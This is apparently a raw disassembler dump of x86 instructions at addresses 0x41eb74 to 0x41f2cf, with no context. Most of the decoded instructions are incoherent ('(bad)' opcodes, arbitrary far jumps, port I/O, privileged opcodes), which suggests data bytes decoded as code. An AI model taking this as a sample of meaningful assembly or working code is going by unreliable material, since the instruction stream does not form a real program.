  41eb74:	(bad)
  41eb78:	daa    
  41eb79:	sbb    edi,DWORD PTR [ecx+0x18e85]
  41eb7f:	scas   al,BYTE PTR es:[edi]
  41eb80:	add    BYTE PTR [eax],al
  41eb82:	add    BYTE PTR [edi-0xc279c8f],bl
  41eb88:	mov    bl,BYTE PTR [ecx+0x32f88a3b]
  41eb8e:	jmp    FWORD PTR [edi+ecx*2]
  41eb91:	pop    ebp
  41eb92:	imul   ebp,DWORD PTR [eax+0x56],0xfffffffe
  41eb96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb97:	dec    ebx
  41eb98:	loop   0x41eb35
  41eb9a:	fiadd  DWORD PTR [ebx]
  41eb9c:	mov    al,ds:0x6fe93a2b
  41eba1:	into   
  41eba2:	add    BYTE PTR [esi+edi*4+0x43],dl
  41eba6:	mov    ecx,0x63ca85d2
  41ebab:	adc    esp,ecx
  41ebad:	sbb    BYTE PTR [esp+edi*1+0x1d],bh
  41ebb1:	out    dx,eax
  41ebb2:	push   0x432130ba
  41ebb7:	add    al,0x26
  41ebb9:	and    al,BYTE PTR [ecx]
  41ebbb:	popa   
  41ebbc:	pop    esp
  41ebbd:	mov    edx,0x4cbda1a2
  41ebc2:	mov    cl,0xfb
  41ebc4:	pop    esi
  41ebc5:	cmp    al,0x8e
  41ebc7:	jmp    0x701b:0xcd15c48
  41ebce:	gs and al,0xb5
  41ebd1:	sub    BYTE PTR [eax-0x319e6955],ah
  41ebd7:	imul   edx,DWORD PTR [eax],0xffffff8b
  41ebda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebdb:	js     0x41ebbf
  41ebdd:	and    ecx,ecx
  41ebdf:	jnp    0x41ebb8
  41ebe1:	bound  ecx,QWORD PTR [ecx]
  41ebe3:	(bad)  
  41ebe4:	and    BYTE PTR [edx],dh
  41ebe6:	jbe    0x41eb76
  41ebe8:	stc    
  41ebe9:	fs ss pop ecx
  41ebec:	fsubp  st(5),st
  41ebee:	xchg   esi,eax
  41ebef:	jb     0x41ec4a
  41ebf1:	inc    edi
  41ebf2:	iret   
  41ebf3:	les    ebp,FWORD PTR [edx]
  41ebf5:	loop   0x41ec67
  41ebf7:	pop    ebx
  41ebf8:	mov    esp,0x20324f17
  41ebfd:	cmp    BYTE PTR [eax+0x5c],ah
  41ec00:	adc    cl,dl
  41ec02:	mov    WORD PTR [ecx+eiz*2],ss
  41ec05:	adc    BYTE PTR [ebp+eiz*1+0x4],0x87
  41ec0a:	xchg   esp,eax
  41ec0b:	mov    bl,0xdd
  41ec0d:	stos   DWORD PTR es:[edi],eax
  41ec0e:	repz test al,0x7b
  41ec11:	iret   
  41ec12:	pop    ebx
  41ec13:	iret   
  41ec14:	icebp  
  41ec15:	fisttp DWORD PTR [eax-0x4a71da62]
  41ec1b:	(bad)  [ebp+0x6480279]
  41ec21:	(bad)  
  41ec22:	stc    
  41ec23:	addr16 add eax,0x4fc844d2
  41ec29:	fld    QWORD PTR [edx]
  41ec2b:	jge    0x41ec54
  41ec2d:	popa   
  41ec2e:	xor    cl,BYTE PTR [esi+edx*4+0x0]
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    BYTE PTR [eax],al
  41ec3b:	hlt    
  41ec3c:	mov    dl,0x32
  41ec3e:	(bad)  
  41ec3f:	jbe    0x41ec17
  41ec41:	hlt    
  41ec42:	mov    dl,0xb1
  41ec44:	and    al,0xfe
  41ec46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec47:	or     al,0xb5
  41ec49:	lahf   
  41ec4a:	jge    0x41ec7f
  41ec4c:	pop    DWORD PTR [ecx]
  41ec4e:	add    BYTE PTR [esi-0x26000000],ch
  41ec54:	jl     0x41ec6d
  41ec56:	in     eax,0x77
  41ec58:	or     eax,0xc9f0c7ee
  41ec5d:	lahf   
  41ec5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec5f:	xor    eax,0x8ec93fe0
  41ec64:	js     0x41ecbf
  41ec66:	push   edi
  41ec67:	cmp    ch,bl
  41ec69:	jo     0x41ec89
  41ec6b:	cmp    ah,cl
  41ec6d:	in     eax,dx
  41ec6e:	add    bl,BYTE PTR ds:0xda0aa9d5
  41ec74:	push   0xcf390b0b
  41ec79:	mov    ah,0xed
  41ec7b:	out    dx,eax
  41ec7c:	xor    BYTE PTR [ecx+0x3c],ah
  41ec7f:	loop   0x41ecf4
  41ec81:	cmp    eax,0x8e266345
  41ec86:	mov    ds:0x5f7964,eax
  41ec8b:	not    BYTE PTR [eax]
  41ec8d:	in     al,0x4e
  41ec8f:	mov    bl,0xc7
  41ec91:	div    ch
  41ec93:	cmp    DWORD PTR [edi+0x19],ebx
  41ec96:	(bad)  
  41ec97:	mov    BYTE PTR [edx+0x2e],ch
  41ec9a:	jecxz  0x41ec8a
  41ec9c:	inc    eax
  41ec9d:	out    0xd3,al
  41ec9f:	(bad)  [ecx+0x7a]
  41eca2:	out    dx,eax
  41eca3:	add    eax,0xec388e0b
  41eca8:	jbe    0x41ec31
  41ecaa:	enter  0x20f7,0x5a
  41ecae:	sbb    ebp,0x3
  41ecb1:	xor    DWORD PTR [esi+ebp*2-0x41de957b],edx
  41ecb8:	adc    DWORD PTR [esp+esi*8-0x58],0x3d948d00
  41ecc0:	test   DWORD PTR [ebp+0x3c943478],esp
  41ecc6:	jmp    0x41ecd1
  41ecc8:	dec    edi
  41ecc9:	(bad)  
  41ecca:	aaa    
  41eccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eccc:	cmp    BYTE PTR [edi-0x58824b0c],ch
  41ecd2:	dec    ebx
  41ecd3:	in     eax,0x4a
  41ecd5:	shr    DWORD PTR [esi-0x51],0x83
  41ecd9:	xor    eax,0xfe7e1fd5
  41ecde:	out    dx,al
  41ecdf:	dec    esi
  41ece0:	jns    0x41ec8c
  41ece2:	mov    ecx,0x1b5dbf30
  41ece7:	fmul   QWORD PTR [ebp+0x54]
  41ecea:	les    esp,FWORD PTR [ebp+0x4be34533]
  41ecf0:	mov    ds:0x532cd390,eax
  41ecf5:	xchg   ebp,eax
  41ecf6:	push   eax
  41ecf7:	push   ds
  41ecf8:	sbb    DWORD PTR [esi+eax*8+0x778efd44],ebx
  41ecff:	fcmovb st,st(1)
	...
  41ed09:	add    BYTE PTR [eax],al
  41ed0b:	xor    dl,bl
  41ed0d:	into   
  41ed0e:	mov    ds:0xd37ebfef,al
  41ed13:	sub    edi,DWORD PTR [esi]
  41ed15:	out    0x3f,eax
  41ed17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed18:	add    eax,DWORD PTR [edx-0x57]
  41ed1b:	loope  0x41ecac
  41ed1d:	add    DWORD PTR [eax],eax
  41ed1f:	scas   al,BYTE PTR es:[edi]
  41ed20:	add    BYTE PTR [eax],al
  41ed22:	add    ch,al
  41ed24:	addr16 int 0xc8
  41ed27:	test   BYTE PTR [edi],ch
  41ed29:	outs   dx,DWORD PTR ds:[esi]
  41ed2a:	mov    WORD PTR [ebx],?
  41ed2c:	imul   ebx,DWORD PTR [edi],0x9c28d554
  41ed32:	mov    al,ds:0x801f7775
  41ed37:	xchg   ebp,eax
  41ed38:	popa   
  41ed39:	fild   DWORD PTR ds:0xfd2c514f
  41ed3f:	sub    eax,0xec5ac173
  41ed44:	xor    eax,esi
  41ed46:	not    BYTE PTR [edx-0x675d4e16]
  41ed4c:	pop    esp
  41ed4d:	mov    ds:0x1eefc825,al
  41ed52:	inc    edi
  41ed53:	ret    0xf3de
  41ed56:	xchg   DWORD PTR [ebx+0x3b5d8f88],esi
  41ed5c:	jl     0x41ed13
  41ed5e:	cs ja  0x41ed37
  41ed61:	push   0xf69b525b
  41ed66:	xlat   BYTE PTR ds:[ebx]
  41ed67:	pop    edi
  41ed68:	xor    eax,0x8cdaf9d
  41ed6d:	clc    
  41ed6e:	adc    esp,0x48
  41ed71:	sub    DWORD PTR [ecx+0x5e0fb201],0xffffffe8
  41ed78:	out    dx,al
  41ed79:	fcomp  DWORD PTR [esi+eax*8+0x6a2692a9]
  41ed80:	dec    ebp
  41ed81:	mov    ecx,0x6828cc37
  41ed86:	nop    esp
  41ed89:	dec    esp
  41ed8a:	sti    
  41ed8b:	retf   
  41ed8c:	pop    ds
  41ed8d:	inc    edx
  41ed8e:	clc    
  41ed8f:	in     eax,0xe1
  41ed91:	fimul  WORD PTR [edx-0x73a48b4f]
  41ed97:	into   
  41ed98:	rcl    BYTE PTR [ecx+edi*8-0x41d43346],1
  41ed9f:	stos   BYTE PTR es:[edi],al
  41eda0:	dec    esi
  41eda1:	xlat   BYTE PTR ds:[ebx]
  41eda2:	xchg   ebx,eax
  41eda3:	xor    ebx,DWORD PTR [ebx-0xf]
  41eda6:	fdivr  st(4),st
  41eda8:	push   eax
  41eda9:	stc    
  41edaa:	neg    DWORD PTR [ebx]
  41edac:	or     al,0xcc
  41edae:	jge    0x41ed9a
  41edb0:	push   eax
  41edb1:	push   eax
  41edb2:	lahf   
  41edb3:	call   0xac8663e2
  41edb8:	aad    0x1
  41edba:	jo     0x41ee0f
  41edbc:	idiv   DWORD PTR ds:0x14345975
  41edc2:	add    ecx,DWORD PTR ds:0x9c200511
  41edc8:	sbb    al,0x7a
  41edca:	mov    bl,0x98
  41edcc:	xor    ebx,DWORD PTR [edi-0x44]
  41edcf:	and    ah,0x0
	...
  41edda:	add    bl,bl
  41eddc:	in     eax,dx
  41eddd:	outs   dx,BYTE PTR ds:[esi]
  41edde:	and    bh,BYTE PTR [esi-0x5d]
  41ede1:	(bad)  
  41ede3:	pop    esi
  41ede4:	(bad)  
  41ede5:	mov    DWORD PTR [ebp+0x7fc60c86],ecx
  41edeb:	(bad)  
  41edec:	nop
  41eded:	add    DWORD PTR [eax],eax
  41edef:	scas   al,BYTE PTR es:[edi]
  41edf0:	add    BYTE PTR [eax],al
  41edf2:	add    BYTE PTR [eax-0x59],ch
  41edf5:	pop    eax
  41edf6:	int    0xea
  41edf8:	inc    ebx
  41edf9:	test   eax,0xbb9ac972
  41edfe:	repz dec ebx
  41ee00:	aas    
  41ee01:	sub    eax,0xb729fcf0
  41ee06:	ins    DWORD PTR es:[edi],dx
  41ee07:	sbb    ebp,DWORD PTR [ebp+0x5a]
  41ee0a:	mov    BYTE PTR gs:[esp+edi*4+0x4853fe40],ch
  41ee12:	bound  edx,QWORD PTR [ebp-0x2a]
  41ee15:	cmp    al,0x37
  41ee17:	mov    ebp,0x38878d2e
  41ee1c:	shr    bh,0xb2
  41ee1f:	dec    ecx
  41ee20:	mov    ch,0xe1
  41ee22:	inc    esi
  41ee23:	mov    ah,0xab
  41ee25:	xor    bl,BYTE PTR [esi]
  41ee27:	popa   
  41ee28:	xchg   edi,eax
  41ee29:	in     al,dx
  41ee2a:	jg     0x41ee98
  41ee2c:	sbb    eax,0x25fa4256
  41ee31:	fcomp  st(1)
  41ee33:	xchg   edx,eax
  41ee34:	fwait
  41ee35:	or     eax,ebp
  41ee37:	fstp   QWORD PTR [ebp-0x4581f360]
  41ee3d:	push   0x1ef9ba25
  41ee42:	cld    
  41ee43:	cmp    ebp,DWORD PTR [esi]
  41ee45:	xor    eax,0x4f
  41ee48:	cmp    eax,0x9ba829a1
  41ee4d:	xchg   ecx,eax
  41ee4e:	cmc    
  41ee4f:	in     al,0xdd
  41ee51:	cdq    
  41ee52:	out    0xeb,al
  41ee54:	fmulp  st(0),st
  41ee56:	js     0x41eeb4
  41ee58:	fsub   QWORD PTR [edi-0x62f0f64d]
  41ee5e:	call   0x1eab1a0d
  41ee63:	push   esp
  41ee64:	bound  edi,QWORD PTR [edx-0x23]
  41ee67:	jl     0x41edf4
  41ee69:	and    BYTE PTR [ebp-0x54a1dcf],0x8b
  41ee70:	pop    ebx
  41ee71:	hlt    
  41ee72:	xchg   esp,eax
  41ee73:	jns    0x41eea1
  41ee75:	and    eax,DWORD PTR [ebp+0x53]
  41ee78:	push   eax
  41ee79:	xchg   ecx,eax
  41ee7a:	push   ds
  41ee7b:	mov    al,0x11
  41ee7d:	bound  ebp,QWORD PTR [eax+0xef3db47]
  41ee83:	jmp    0x6829:0xa30fe859
  41ee8a:	retf   0xe6ba
  41ee8d:	cwde   
  41ee8e:	jb     0x41ee56
  41ee90:	outs   dx,BYTE PTR ds:[esi]
  41ee91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee92:	push   edi
  41ee93:	push   cs
  41ee94:	test   BYTE PTR [edi+0x60],ah
  41ee97:	push   ss
  41ee98:	add    cl,bh
  41ee9a:	sbb    esp,DWORD PTR [ebx]
  41ee9c:	dec    edx
  41ee9d:	es test al,0x66
  41eea0:	arpl   WORD PTR [eax],ax
	...
  41eeaa:	add    BYTE PTR ds:0x6f976b22,al
  41eeb0:	(bad)  
  41eeb2:	mov    dl,0x66
  41eeb4:	and    BYTE PTR [esi+0x4186d16a],ah
  41eeba:	sub    eax,0x1913d
  41eebf:	scas   al,BYTE PTR es:[edi]
  41eec0:	add    BYTE PTR [eax],al
  41eec2:	add    BYTE PTR [ecx-0x1d],cl
  41eec5:	outs   dx,DWORD PTR ds:[esi]
  41eec6:	adc    dl,bl
  41eec8:	push   es
  41eec9:	pop    es
  41eeca:	adc    cl,BYTE PTR [ebx]
  41eecc:	adc    al,0xf8
  41eece:	jnp    0x41ee74
  41eed0:	mov    WORD PTR [edx+ebp*4-0x69e12d56],gs
  41eed7:	pop    eax
  41eed8:	cmp    dh,BYTE PTR [edi-0x43]
  41eedb:	jbe    0x41eea7
  41eedd:	js     0x41ee95
  41eedf:	mov    bl,0xd5
  41eee1:	xlat   BYTE PTR ds:[ebx]
  41eee2:	add    DWORD PTR [edi],edx
  41eee4:	fnstcw WORD PTR [edx+0x3c9f2aa]
  41eeea:	les    ebx,FWORD PTR [edx+0x2]
  41eeed:	xor    al,0x95
  41eeef:	and    eax,0x9599bca8
  41eef4:	push   ebx
  41eef5:	icebp  
  41eef6:	ret    
  41eef7:	hlt    
  41eef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef9:	ins    BYTE PTR es:[edi],dx
  41eefa:	shl    DWORD PTR [esi-0x6c0c8593],0x38
  41ef01:	adc    DWORD PTR [edx+0x5c],ebp
  41ef04:	xchg   BYTE PTR [ebx],bh
  41ef06:	inc    ebx
  41ef07:	mov    esi,0x47e3911c
  41ef0c:	sub    cl,BYTE PTR [ecx+eiz*2+0x32b71e49]
  41ef13:	jns    0x41eef7
  41ef15:	mov    bh,0x2e
  41ef17:	mov    ah,0xf0
  41ef19:	or     edx,ebx
  41ef1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef1c:	push   edx
  41ef1d:	bound  eax,QWORD PTR [eax-0xf]
  41ef20:	sub    DWORD PTR [eax-0x31],esp
  41ef23:	cmp    esp,ecx
  41ef25:	pop    edx
  41ef26:	nop
  41ef27:	dec    ebp
  41ef28:	js     0x41ef59
  41ef2a:	add    al,0xe7
  41ef2c:	add    bh,ah
  41ef2e:	pop    esi
  41ef2f:	aaa    
  41ef30:	das    
  41ef31:	ja     0x41eefa
  41ef33:	(bad)  
  41ef34:	js     0x41ef77
  41ef36:	dec    edx
  41ef37:	sti    
  41ef38:	inc    esp
  41ef39:	push   esi
  41ef3a:	dec    esp
  41ef3b:	push   0x9207aa6
  41ef40:	xor    al,0x80
  41ef42:	jnp    0x41ef14
  41ef44:	fidiv  DWORD PTR [ecx+esi*8-0x2b]
  41ef48:	loopne 0x41ef20
  41ef4a:	mov    al,BYTE PTR [edx]
  41ef4c:	xchg   edx,eax
  41ef4d:	and    al,0x36
  41ef4f:	sub    BYTE PTR ds:0x7433eb3c,bh
  41ef55:	dec    esi
  41ef56:	blcfill esp,esp
  41ef5b:	in     al,0x81
  41ef5d:	jmp    0xf409:0xe0a6ecbb
  41ef64:	aas    
  41ef65:	xchg   esi,eax
  41ef66:	into   
  41ef67:	ror    BYTE PTR [eax+eiz*1],1
  41ef6a:	add    BYTE PTR [ecx],0x52
  41ef6d:	add    DWORD PTR [esi+ebp*1+0x72],0x0
	...
  41ef7a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef80:	stc    
  41ef81:	call   esi
  41ef83:	into   
  41ef84:	inc    ebp
  41ef85:	mov    bh,0x11
  41ef87:	inc    edx
  41ef88:	add    eax,esp
  41ef8a:	mov    edx,0x191eb
  41ef8f:	scas   al,BYTE PTR es:[edi]
  41ef90:	add    BYTE PTR [eax],al
  41ef92:	add    BYTE PTR [edx-0x15],dh
  41ef95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef96:	pusha  
  41ef97:	push   ebp
  41ef98:	push   esi
  41ef99:	cwde   
  41ef9a:	cdq    
  41ef9b:	in     al,dx
  41ef9c:	push   ecx
  41ef9d:	push   eax
  41ef9e:	mov    dl,0x9
  41efa0:	inc    edi
  41efa1:	sti    
  41efa2:	arpl   bx,si
  41efa4:	push   edi
  41efa5:	dec    esi
  41efa6:	popf   
  41efa7:	mov    ds:0xf3499bb1,al
  41efac:	jge    0x41efcd
  41efae:	dec    ebp
  41efaf:	shr    DWORD PTR [edx+0x25d27e3c],1
  41efb5:	mov    ebp,0xa61cb484
  41efba:	retf   0x478
  41efbd:	and    eax,0x401d45d9
  41efc2:	xor    al,0xd8
  41efc4:	pop    ecx
  41efc5:	adc    ecx,DWORD PTR [ebp+0x3b926072]
  41efcb:	dec    eax
  41efcc:	mov    ds:0xc0d48de7,al
  41efd1:	sub    DWORD PTR [ecx+0x5e139dd1],edx
  41efd7:	sub    cl,BYTE PTR [eax]
  41efd9:	dec    esi
  41efda:	add    eax,0xac506ddd
  41efdf:	or     BYTE PTR [eax-0x3d4a40b0],0x83
  41efe6:	lds    ecx,FWORD PTR [edx]
  41efe8:	aas    
  41efe9:	adc    DWORD PTR [ecx],ebx
  41efeb:	sbb    DWORD PTR [ecx],ebp
  41efed:	sbb    edx,ebp
  41efef:	or     eax,0xf61b0a90
  41eff4:	jb     0x41f05d
  41eff6:	pusha  
  41eff7:	push   ebp
  41eff8:	mov    eax,0x2fd51675
  41effd:	sub    BYTE PTR [ebx+0x4c],al
  41f000:	xor    BYTE PTR [edx-0x4a],bl
  41f003:	int3   
  41f004:	or     al,0x69
  41f006:	pusha  
  41f007:	push   edi
  41f008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f009:	cmc    
  41f00a:	sub    DWORD PTR [ecx-0x6],0xc53d5efe
  41f011:	(bad)  
  41f013:	nop
  41f014:	loopne 0x41ef99
  41f016:	dec    ebx
  41f017:	hlt    
  41f018:	adc    esi,DWORD PTR [edi-0x3b343d4]
  41f01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f01f:	xchg   DWORD PTR [esi+0x262713f7],esp
  41f025:	pop    esp
  41f026:	or     al,0x4b
  41f028:	jne    0x41efde
  41f02a:	pop    esp
  41f02b:	pop    edi
  41f02c:	push   eax
  41f02d:	(bad)  
  41f02f:	hlt    
  41f030:	xor    al,0x4b
  41f032:	gs loopne 0x41effe
  41f035:	mov    ss,WORD PTR [edi+ebx*8+0x4a]
  41f039:	xor    ah,cl
  41f03b:	sti    
  41f03c:	gs xchg esp,eax
  41f03e:	mov    edi,0x2313
	...
  41f04b:	fisubr WORD PTR [ecx]
  41f04d:	cwde   
  41f04e:	sar    bh,cl
  41f050:	repz fisubr WORD PTR ds:0x4af35f6
  41f057:	(bad)  
  41f058:	pop    edx
  41f059:	mov    ebx,0x192994c
  41f05e:	add    BYTE PTR [esi+0x3000000],ch
  41f064:	cli    
  41f065:	test   dl,dl
  41f067:	xchg   edx,eax
  41f068:	push   edi
  41f069:	mov    ds:0x15670b1e,eax
  41f06e:	push   eax
  41f06f:	scas   eax,DWORD PTR es:[edi]
  41f070:	mov    bl,0x4d
  41f072:	popf   
  41f073:	jp     0x41f016
  41f075:	sub    DWORD PTR ds:0x7b88aff,edx
  41f07b:	stc    
  41f07c:	jmp    0x41f0f3
  41f07e:	push   eax
  41f07f:	ficomp DWORD PTR [edi-0x768c6053]
  41f085:	or     ecx,ecx
  41f087:	das    
  41f088:	loope  0x41f01e
  41f08a:	xchg   edx,eax
  41f08b:	out    0x79,al
  41f08d:	adc    al,0x8b
  41f08f:	mov    ebp,gs
  41f091:	fldcw  WORD PTR [ebp-0x52]
  41f094:	out    0x48,eax
  41f096:	xchg   DWORD PTR [edx-0x6729d3de],edi
  41f09c:	mov    ebp,0x9c7c0adf
  41f0a1:	adc    eax,0x62723a0d
  41f0a6:	fcom   QWORD PTR [esi]
  41f0a8:	cmp    DWORD PTR [ebx],0x4dd4aa06
  41f0ae:	fidiv  DWORD PTR [ebx-0x3fd79c3c]
  41f0b4:	push   edx
  41f0b5:	sti    
  41f0b6:	cmp    edx,ebp
  41f0b8:	lods   eax,DWORD PTR ds:[esi]
  41f0b9:	mov    edx,0x1d2b6e46
  41f0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0bf:	push   ebx
  41f0c0:	aad    0xb3
  41f0c2:	inc    ebx
  41f0c3:	sub    al,BYTE PTR [eax+eiz*1+0x7b4162fe]
  41f0ca:	(bad)  
  41f0cb:	adc    dh,dh
  41f0cd:	in     al,dx
  41f0ce:	pop    esp
  41f0cf:	xchg   DWORD PTR [ecx-0x5e],esp
  41f0d2:	jecxz  0x41f0fd
  41f0d4:	jbe    0x41f086
  41f0d6:	scas   eax,DWORD PTR es:[edi]
  41f0d7:	inc    al
  41f0d9:	pop    ss
  41f0da:	xor    al,0x29
  41f0dc:	mov    ch,0x67
  41f0de:	(bad)  
  41f0df:	mov    ch,0x9d
  41f0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0e2:	dec    esi
  41f0e3:	xchg   BYTE PTR [eax+0x65],al
  41f0e6:	sbb    al,0xbb
  41f0e8:	mov    ah,0xf8
  41f0ea:	or     al,0x77
  41f0ec:	and    DWORD PTR [esi],ebp
  41f0ee:	std    
  41f0ef:	stos   DWORD PTR es:[edi],eax
  41f0f0:	and    DWORD PTR [ebp-0x11],ebp
  41f0f3:	ins    BYTE PTR es:[edi],dx
  41f0f4:	gs jmp 0x6811:0xea9eb462
  41f0fc:	cld    
  41f0fd:	mov    edi,0xd95cbe32
  41f102:	pop    esi
  41f103:	stc    
  41f104:	pop    es
  41f105:	and    esi,ecx
  41f107:	ffreep st(7)
  41f109:	add    al,0xcb
  41f10b:	inc    esp
  41f10c:	stc    
  41f10d:	fdiv   DWORD PTR [edi]
  41f10f:	push   ecx
  41f110:	fwait
	...
  41f119:	add    BYTE PTR [eax],al
  41f11b:	dec    esi
  41f11c:	aas    
  41f11d:	int3   
  41f11e:	sbb    eax,0x7fdffffd
  41f123:	out    dx,eax
  41f124:	loopne 0x41f13c
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	imul   esp,DWORD PTR [edx],0x77
  41f12a:	push   esp
  41f12b:	inc    edi
  41f12c:	xchg   ebx,eax
  41f12d:	add    DWORD PTR [eax],eax
  41f12f:	scas   al,BYTE PTR es:[edi]
  41f130:	add    BYTE PTR [eax],al
  41f132:	add    ch,al
  41f134:	mov    ds:0xa56cc91f,eax
  41f139:	into   
  41f13a:	sub    ebp,0xffffffef
  41f13d:	jp     0x41f144
  41f13f:	loopne 0x41f131
  41f141:	fwait
  41f142:	test   BYTE PTR [ebx+0x19],ah
  41f145:	ret    0xa0fe
  41f148:	call   0xd666c9b5
  41f14d:	mov    DWORD PTR [esi+0x48381387],0xe759dba7
  41f157:	sbb    DWORD PTR [ebx+eiz*2+0x6e],ebp
  41f15b:	cmp    eax,0x2ac3bbab
  41f160:	cli    
  41f161:	mov    bl,0xe7
  41f163:	cmp    BYTE PTR [ebp-0x11],al
  41f166:	adc    eax,0xdb08b6f6
  41f16b:	mov    ch,0xc6
  41f16d:	inc    ebp
  41f16e:	fistp  WORD PTR [edx-0x15]
  41f171:	(bad)  
  41f172:	jo     0x41f121
  41f174:	les    eax,FWORD PTR ss:[edi+edx*2]
  41f178:	pushf  
  41f179:	jp     0x41f109
  41f17b:	retf   0x5581
  41f17e:	loope  0x41f153
  41f180:	aam    0xca
  41f182:	aaa    
  41f183:	mov    bh,0x60
  41f185:	jae    0x41f123
  41f187:	push   ebp
  41f188:	dec    ebx
  41f189:	(bad)  
  41f18a:	mov    al,ds:0x3deb9417
  41f18f:	jl     0x41f166
  41f191:	sbb    DWORD PTR [ebp-0x68],eax
  41f194:	push   ds
  41f195:	bound  eax,QWORD PTR [esi]
  41f197:	ins    DWORD PTR es:[edi],dx
  41f198:	sbb    dl,BYTE PTR [edx]
  41f19a:	mov    ds:0xf20cd6b6,al
  41f19f:	test   eax,0xfb462a5e
  41f1a4:	imul   BYTE PTR [eax+0x44]
  41f1a7:	push   eax
  41f1a8:	xor    eax,esp
  41f1aa:	dec    eax
  41f1ab:	scas   eax,DWORD PTR es:[edi]
  41f1ac:	repnz mov ebx,DWORD PTR [ebx+esi*1]
  41f1b0:	add    al,0x7a
  41f1b2:	or     eax,eax
  41f1b4:	mov    ebp,0x7baff940
  41f1b9:	jmp    0xb3f55272
  41f1be:	mov    cl,0x39
  41f1c0:	dec    ebp
  41f1c1:	mov    bl,0xd2
  41f1c3:	jl     0x1f99b485
  41f1c9:	call   0xef375a50
  41f1ce:	je     0x41f1cf
  41f1d0:	(bad)  
  41f1d1:	cwde   
  41f1d2:	arpl   WORD PTR [eax+edi*2],si
  41f1d5:	(bad)  
  41f1d7:	dec    edx
  41f1d8:	scas   eax,DWORD PTR es:[edi]
  41f1d9:	inc    eax
  41f1da:	out    0x46,eax
  41f1dc:	dec    edx
  41f1dd:	adc    DWORD PTR [esi+0x8a49],ebx
	...
  41f1eb:	push   ds
  41f1ec:	test   eax,0x7ff735f6
  41f1f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1f7:	imul   esp,ecx,0xffffffde
  41f1fa:	lock cmc 
  41f1fc:	xchg   ebx,eax
  41f1fd:	add    DWORD PTR [eax],eax
  41f1ff:	scas   al,BYTE PTR es:[edi]
  41f200:	add    BYTE PTR [eax],al
  41f202:	add    BYTE PTR [edi],bl
  41f204:	sub    ecx,DWORD PTR [esi+edx*8]
  41f207:	push   ebp
  41f208:	xor    al,0x62
  41f20a:	add    edi,DWORD PTR [edx]
  41f20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f20d:	out    dx,al
  41f20e:	ror    DWORD PTR [edx],0x23
  41f211:	lds    edx,FWORD PTR [ebp+0x5b]
  41f214:	mov    bh,0xd2
  41f216:	jecxz  0x41f1ce
  41f218:	ins    DWORD PTR es:[edi],dx
  41f219:	mov    dl,0x1f
  41f21b:	stos   BYTE PTR es:[edi],al
  41f21c:	jmp    0xf300:0xae346035
  41f223:	test   BYTE PTR [ebx],cl
  41f225:	push   es
  41f226:	adc    eax,0x6b
  41f229:	adc    BYTE PTR [esi],dl
  41f22b:	cs jmp 0x6d6d:0xdb2cac26
  41f233:	(bad)  [edi]
  41f235:	sub    eax,0xdf43c1e6
  41f23a:	mov    al,0x51
  41f23c:	ret    0x8bb2
  41f23f:	out    0xad,eax
  41f241:	std    
  41f242:	xor    ebx,ecx
  41f244:	aam    0x37
  41f246:	push   ebp
  41f247:	sbb    DWORD PTR ds:0x9e79651e,0x26
  41f24e:	sbb    ebp,edx
  41f250:	rol    ebx,0xd9
  41f253:	les    ecx,FWORD PTR [ebx]
  41f255:	aam    0xf9
  41f257:	inc    eax
  41f258:	nop
  41f259:	bound  edx,QWORD PTR [ebx]
  41f25b:	cdq    
  41f25c:	and    DWORD PTR [esi-0x69],ebp
  41f25f:	int3   
  41f260:	push   eax
  41f261:	cwde   
  41f262:	ffreep st(4)
  41f264:	(bad)  
  41f265:	clc    
  41f266:	pushf  
  41f267:	std    
  41f268:	jge    0x41f20c
  41f26a:	(bad)  
  41f26b:	jp     0x41f285
  41f26d:	es jg  0x41f2d3
  41f270:	fwait
  41f271:	pmulhw mm4,QWORD PTR [esi+0x29]
  41f275:	pop    ecx
  41f276:	adc    eax,0x81bdeaac
  41f27b:	mov    al,ds:0x29d9434c
  41f280:	cwde   
  41f281:	outs   dx,BYTE PTR ds:[esi]
  41f282:	pop    ecx
  41f283:	stc    
  41f284:	push   edi
  41f285:	or     DWORD PTR [eax+0x51],ebp
  41f288:	int    0x1d
  41f28a:	ret    0xaca0
  41f28d:	dec    esp
  41f28e:	daa    
  41f28f:	sub    al,0x5c
  41f291:	sbb    DWORD PTR [ebx],ecx
  41f293:	aaa    
  41f294:	fcmovnu st,st(3)
  41f296:	dec    edx
  41f297:	test   cl,al
  41f299:	loopne 0x41f277
  41f29b:	inc    ebp
  41f29c:	ins    BYTE PTR es:[edi],dx
  41f29d:	fisub  WORD PTR [ebx]
  41f29f:	inc    ecx
  41f2a0:	dec    ebp
  41f2a1:	cmc    
  41f2a2:	jns    0x41f2e2
  41f2a4:	dec    edi
  41f2a5:	xchg   BYTE PTR [edx],bl
  41f2a7:	xchg   edx,eax
  41f2a8:	sbb    bl,al
  41f2aa:	scas   al,BYTE PTR es:[edi]
  41f2ab:	in     al,dx
  41f2ac:	stos   BYTE PTR es:[edi],al
  41f2ad:	push   cs
  41f2ae:	mov    ebp,0x46ee
	...
  41f2bb:	fwait
  41f2bc:	loope  0x41f32b
  41f2be:	sub    eax,0xf7dbad7f
  41f2c3:	sar    BYTE PTR [ebx],cl
  41f2c5:	(bad)  
  41f2c6:	add    BYTE PTR [ebx],cl
  41f2c8:	push   0x94a38538
  41f2cd:	add    DWORD PTR [eax],eax
  41f2cf:	scas   al,BYTE PTR es:[edi]
